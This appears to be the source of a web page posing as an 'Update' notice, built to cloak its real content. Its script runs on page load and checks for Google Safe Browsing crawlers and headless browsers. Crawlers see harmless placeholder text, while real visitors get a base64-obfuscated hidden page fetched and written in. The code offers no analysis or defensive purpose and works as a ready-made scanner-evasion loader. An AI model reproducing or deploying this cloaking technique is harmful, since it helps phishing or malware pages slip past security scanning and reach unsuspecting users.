<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update</title>
    <script>
        // /hidden_content/update_content.html -> L2hpZGRlbl9jb250ZW50L3VwZGF0ZV9jb250ZW50Lmh0bWw=
        const realContent = 'L2hpZGRlbl9jb250ZW50L3VwZGF0ZV9jb250ZW50Lmh0bWw=';

        // GSB Crawler Detection: Multiple checks for headless browsers
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const hasNotificationAPI = typeof self.Notification !== 'undefined';
        const hasWebdriver = navigator.webdriver === true;
        const hasPlugins = navigator.plugins && navigator.plugins.length > 0;
        const isRealBrowser = (hasNotificationAPI && !hasWebdriver && hasPlugins) || isMobile;

        if (isRealBrowser) {
            fetch(atob(realContent))
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to load content');
                    }
                    return response.text();
                })
                .then(html => {
                    document.open();
                    document.write(html);
                    document.close();
                })
                .catch(err => {
                    console.error('Error loading content:', err);
                    // Show benign content on error instead of failing silently
                    document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
                });
        } else {
            // GSB Crawler / Bot (headless Chrome) - Show benign content
            document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
        }
    </script>
</head>
